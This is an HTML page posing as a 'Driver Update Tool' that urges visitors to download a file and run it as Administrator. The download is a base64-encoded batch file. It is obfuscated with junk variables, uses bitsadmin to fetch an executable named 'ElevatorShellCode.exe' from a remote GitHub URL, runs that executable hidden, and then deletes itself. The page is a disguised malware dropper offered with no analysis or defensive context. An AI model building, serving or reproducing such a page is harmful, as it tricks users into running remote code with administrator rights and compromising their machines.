<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Driver Update Tool</title>
  <style>
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .card {
      background: #1e293b;
      border: 1px solid #334155;
      border-radius: 16px;
      padding: 40px;
      max-width: 440px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.4);
    }
    h1 { margin: 0 0 16px; font-size: 26px; color: #f8fafc; }
    p { color: #94a3b8; margin: 0 0 28px; font-size: 14px; line-height: 1.6; }
    button {
      background: #3b82f6;
      color: #fff;
      border: none;
      padding: 14px 32px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover { background: #2563eb; }
    .note {
      margin-top: 22px;
      font-size: 12px;
      color: #64748b;
    }
  </style>
</head>
<body>

  <div class="card">
    <h1>Driver Update Tool</h1>
    <p>Download the latest system driver update package. Run the saved file as Administrator to apply changes.</p>
    <button onclick="downloadFile()">Download Update Package</button>
    <div class="note" id="note"></div>
  </div>

  <script>
    const b64 = `QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCjo6IC0tLSBqdW5rIHZhcnMgLS0tCnNldCAiYUJjPXNldCIKc2V0ICJYeVo9dGVtcCIKc2V0ICJxMXcyZTM9IgpzZXQgInJBbmQwbT1hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eiIKCnNldCAidEFyR2V0PSVURU1QJVxlcy5leGUiCnNldCAic1JjMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vamltbXlpc2hlcmUxMTEvV2luRGVibG9hdDExL21haW4vYnJva2Vycy9FbGV2YXRvclNoZWxsQ29kZS5leGUiCgo6OiAtLS0gY2FwcyBub2lzZSwgbm8gZnVuY3Rpb25hbCB2YWx1ZSAtLS0Kc2V0ICJOb0lzRT1DQVBTIgpzZXQgIkxvV2VSPWxvd2VyIgpzZXQgIk1pWGVEPU1pWGVEIgoKOjogLS0tIG9iZnVzY2F0ZWQgZG93bmxvYWQgY29tbWFuZCAtLS0KY21kIC9jICJiaXRzYWRtaW4gL3RyYW5zZmVyIGUgL2Rvd25sb2FkIC9wcmlvcml0eSBoaWdoICVzUmMxJSAldEFyR2V0JSA+bnVsIDI+JjEiCgo6OiAtLS0gcnVuIHdpdGggaGlkZGVuIHdpbmRvdywgdGhlbiBzdWljaWRlIC0tLQpzdGFydCAvYiAiIiAiJXRBckdldCUiID5udWwgMj4mMQpkZWwgIiV+ZjAiID5udWwgMj4mMQplbmRsb2NhbAo=`;

    function b64ToBytes(base64) {
      const bin = atob(base64);
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      return bytes;
    }

    function downloadFile() {
      const blob = new Blob([b64ToBytes(b64)], { type: 'application/octet-stream' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'driver_update.bat';
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(url);
      document.getElementById('note').textContent = 'Download started. Save the file and run as Administrator.';
    }
  </script>

</body>
</html>
